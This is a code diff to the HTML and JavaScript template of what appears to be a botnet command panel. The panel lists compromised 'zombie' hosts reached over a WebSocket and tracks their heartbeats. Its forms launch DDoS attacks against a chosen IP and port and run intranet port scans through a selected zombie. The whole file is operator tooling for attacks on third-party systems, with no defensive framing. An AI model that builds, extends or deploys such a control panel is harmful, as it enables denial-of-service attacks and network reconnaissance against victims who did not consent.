@@ -8,8 +8,6 @@
 
 <head>
 	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
-
-	<script type="text/javascript" src="{{ STATIC_URL }}js/ws4redis.min.js"></script>
 	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 	<script type="text/javascript" src="{{STATIC_URL}}js/bootbox.min.js"></script>
 	<script type="text/javascript" src="{{STATIC_URL}}js/bootstrap.min.js"></script>
@@ -63,58 +61,67 @@
 
 
 
-var solo_socket = null;
-
+var websocket = null;
+var zombies = {};
 $(function(){
 
-	solo_socket = new WebSocket('{{WEBSOCKET_URI}}attacker?subscribe-session');
+	websocket = new WebSocket('{{WEBSOCKET_URI}}attacker?subscribe-session');
 
 
-	solo_socket.onopen = function(e){
-		//solo_socket.send("LOLz");
-		//setInterval(function(){solo_socket.send("LOL");},3000);
-		//setInterval(function(){solo_socket.send("MOLS");},1000);
+
+	websocket.onopen = function(e){
+		setInterval(function(){websocket.send("--heartbeat--");},5000);
 	}
-	solo_socket.onmessage = function(e){
-		console.log(e);
-	}
+	websocket.onmessage = function(msg){
+		try{
+			var json = JSON.parse(msg.data);
+			///new or reconnected zombie
+			if(json.hasOwnProperty('new') == true){
+				if(zombies.hasOwnProperty(json['newzombieId'])==false){
+					zombies[json['newzombieId']]=setTimeout(function(){
+							//mark dead
+							$("#"+json["newzombieId"]).css("background-color","#ff0000");
+					},10000);
+					$("table[name='zombies']").append(	"<tr class='active'><td class='clickable-row' style='background-color:#00ff00' id="+json['newzombieId']+">"+json['newzombieHost']+"</td></tr>");
+					$("table[name='zombies'] tr").click(function(){
+								$("tr").css("border","");
+								$(this).css("border","3px solid black");
+								$("tr").removeClass("selected");
+								$(this).addClass("selected");
+					});
+				}
+				else{
+					clearInterval(zombies[json['newzombieId']]);
+					$("#"+json['newzombieId']).css("background-color","#00ff00");
+					zombies[json['newzombieId']]=setTimeout(function(){
+							//mark dead
+							$("#"+json["newzombieId"]).css("background-color","#ff0000");
+					},10000);
 
-	var zombies = {};
-	function msghandler(json){
-
-	json = JSON.parse(json);
-	///new or reconnected zombie
-	if(json.hasOwnProperty('new') == true){
-		if(zombies.hasOwnProperty(json['newzombieId'])==false){
-			zombies[json['newzombieId']]=setTimeout(function(){
-					//mark dead
-					console.log("DEAD");
-			},10000);
-			$("table[name='zombies']").append(	"<tr class='active'><td id="+json['newzombieId']+">"+json['newzombieHost']+"<span class ='glyphicon glyphicon-flash'></span></td></tr>");
-
+				}
+			}
+			//update from portscan
+			else if(json.hasOwnProperty("host")==true){
+					console.log("host");
+					$("tbody[name='hosts']").append(	"<tr class='active'><td>"+json['host']+"</td></tr>");
+			}
 		}
-		else{
-			clearInterval(zombies[json['newzombieId']]);
-			zombies[json['newzombieId']]=setTimeout(function(){
-					//mark dead
-					console.log("DEAD");
-			},10000);
-
+		catch(e){
+			//heartbeat
 		}
-	}
-	//update from portscan
-	else if(json.hasOwnProperty("host")==true){
 
-			$("tbody[name='hosts']").append(	"<tr class='active'><td><span class ='glyphicon glyphicon-flash'>"+json['host']+"</span></td></tr>");
 	}
 
-}
+
+
 });
 
 
 function ddos(){
 
-	var targ = $("#target").val();
+	var targ = $("#ip").val();
+	var port = $("#port").val();
+	targ = targ+":"+port;
 	var timeout = $("#timeout").val();
 	$.ajax({
 		url:"{% url 'control-ddos'%}",
@@ -126,7 +133,12 @@ function ddos(){
 
 
 function portscan(){
-	var targ = $("#network").val();
+	var targ = $(".selected td").html();
+	if(targ==undefined){
+		bootbox.alert("please select a zombie");
+		return;
+	}
+	$("tbody[name='hosts']").empty();
 	$.ajax({
 		url:"{% url 'control-localportscan' %}",
 		type: 'POST',
@@ -168,7 +180,55 @@ function createHook(){
 			}
 	});
 }
+
+
+function showDdos(){
+
+	$("div[name='currentattack']").empty();
+	$("div[name='currentattack'").append('<div class="ddos">\
+	<div class="form-inline" >\
+		<h4>DDOS Attack</h4>\
+		<div class="form-group">\
+		<label for="ip">IP</label>\
+		<input type="text" class="form-control" id="ip" placeholder="ip address">\
+		<label for="port">Port</label>\
+		<input type="text" class="form-control" id="port" placeholder="port">\
+			<label for="timeout">Speed</label>\
+			<input type="text" class="form-control" id="timeout" placeholder="speed">\
+		</div>\
+		<button onclick="ddos();" class="btn btn-default">Start Attack</button>\
+		<button onclick="cancel();" class="btn btn-default">Cancel</button>\
+		</div>\
+	</div>');
+
+}
+
+function showPortScan(){
+	$("div[name='currentattack']").empty();
+	$("div[name='currentattack']").append('	<div class="portscan">\
+			<div class="form-inline">\
+			<h4>Intranet Port Scan</h4>\
+				<div class="form-group">\
+					<label for="timeout">Speed</label>\
+					<input type="text" class="form-control" id="timeout" placeholder="speed">\
+				</div>\
+				<button onclick="portscan();" class="btn btn-default">Start Attack</button>\
+				<button onclick="cancel();" class="btn btn-default">Cancel</button>\
+			</div>\
+		</div>\
+		<div class="hosts">\
+				<h1 style="text-align: center;"><small>Scanned Hosts</small></h1>\
+			<table class ="table table-condensed" >\
+				<tbody name="hosts">\
+			</tbody>\
+			</table>\
+		</div>');
+}
+
+
+
 $(function(){createHook();})
+/*
 $(function(){$(".ddos").hide();})
 $(function(){$(".portscan").hide();})
 $(function(){$(".hosts").hide();})
@@ -180,7 +240,7 @@ function drop(input){
 		$(".hosts").toggle();
 	}
 
-}
+}*/
 
 
 </script>
@@ -202,11 +262,11 @@ function drop(input){
 				<h1 style="text-align: center;"><small>Zombies</small></h1>
 			<table class ="table table-condensed" name="zombies">
 				<tbody>
-				{%for zombie in zombies%}
+		<!--		{%for zombie in zombies%}
 				<tr class="active">
 					<td id={{zombie.id}}>{{zombie.host}} <span class ="glyphicon glyphicon-flash"></span></td>
 				</tr>
-				{%endfor%}
+				{%endfor%}-->
 			</tbody>
 			</table>
 		</div>
@@ -218,7 +278,7 @@ function drop(input){
 
 		<div class="attacks" >
 
-		<table class="table table-bordered" >
+		<table name="attacks" class="table table-bordered" >
 			<tbody>
 
 				<td>
@@ -226,10 +286,10 @@ function drop(input){
 				</td>
 			</tr>
 			<tr>
-				<td><button style="width: 100%;" onclick="drop('ddos');" class="btn btn-default"> DDOS</button></td>
+				<td><button style="width: 100%;" onclick="showDdos();" class="btn btn-default"> DDOS</button></td>
 				</tr>
 			<tr>
-					<td><button style="width: 100%;" onclick="drop('portscan');" class="btn btn-default">PORT SCAN</button</td>
+					<td><button style="width: 100%;" onclick="showPortScan();" class="btn btn-default">PORT SCAN</button</td>
 				</tr>
 
 		</tbody>
@@ -241,45 +301,8 @@ function drop(input){
 
 	<div class="col-md-4 col-md-offset-20">
 		<h1 style="text-align:center;" > <small>Current Attack</small></h1>
-		<div class="ddos">
-		<div class="form-inline" >
-			<div class="form-group">
-				<label for="target">DDOS Target</label>
-				<input type="text" class="form-control" id="target" placeholder="ddos target">
-				<label for="timeout">Timeout</label>
-				<input type="text" class="form-control" id="timeout" placeholder="timeout">
-			</div>
-
-			<button onclick="ddos();" class="btn btn-default">Start Attack</button>
-			<button onclick="cancel();" class="btn btn-default">Cancel</button>
+		<div name="currentattack">
 		</div>
-		</div>
-
-
-		<div class="portscan">
-			<div class="form-inline">
-				<div class="form-group">
-					<label for="network">Scan Zombie</label>
-					<input type="text" clas="form-control" id="network" placeholder="target zombie">
-					<label for="timeout">Timeout</label>
-					<input type="text" class="form-control" id="timeout" placeholder="timeout">
-				</div>
-				<button onclick="portscan();" class="btn btn-default">Start Attack</button>
-				<button onclick="cancel();" class="btn btn-default">Cancel</button>
-			</div>
-		</div>
-
-
-
-
-		<div class="hosts">
-				<h1 style="text-align: center;"><small>Scanned Hosts</small></h1>
-			<table class ="table table-condensed" >
-				<tbody name="hosts">
-			</tbody>
-			</table>
-		</div>
-
 
 
 
